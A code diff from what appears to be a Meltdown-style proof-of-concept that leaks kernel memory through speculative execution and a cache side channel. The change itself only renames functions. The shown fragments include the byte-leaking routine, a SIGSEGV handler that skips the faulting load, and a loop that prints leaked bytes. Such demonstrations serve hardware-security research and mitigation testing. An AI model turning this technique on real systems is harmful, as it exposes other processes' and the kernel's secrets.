@@ -46,7 +46,7 @@ const char *public_data = "Hello, world!";
 //
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, speculatively loading data accessible only in the kernel mode.
-static char leak_byte(const char *data, size_t offset) {
+static char LeakByte(const char *data, size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
 
@@ -84,7 +84,7 @@ static char leak_byte(const char *data, size_t offset) {
   }
 }
 
-static void sigsegv(
+static void Sigsegv(
     int /* signum */, siginfo_t * /* siginfo */, void *context) {
   // SIGSEGV signal handler.
   // Moves the instruction pointer to the "afterspeculation" label.
@@ -103,9 +103,9 @@ static void sigsegv(
 #endif
 }
 
-static void set_signal() {
+static void SetSignal() {
   struct sigaction act;
-  act.sa_sigaction = sigsegv;
+  act.sa_sigaction = Sigsegv;
   act.sa_flags = SA_SIGINFO;
   sigaction(SIGSEGV, &act, NULL);
 }
@@ -125,13 +125,13 @@ int main() {
   in >> std::dec >> private_length;
   in.close();
 
-  set_signal();
+  SetSignal();
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset =
       reinterpret_cast<const char *>(private_data) - public_data;
   for (size_t i = 0; i < private_length; ++i) {
-    std::cout << leak_byte(public_data, private_offset + i);
+    std::cout << LeakByte(public_data, private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
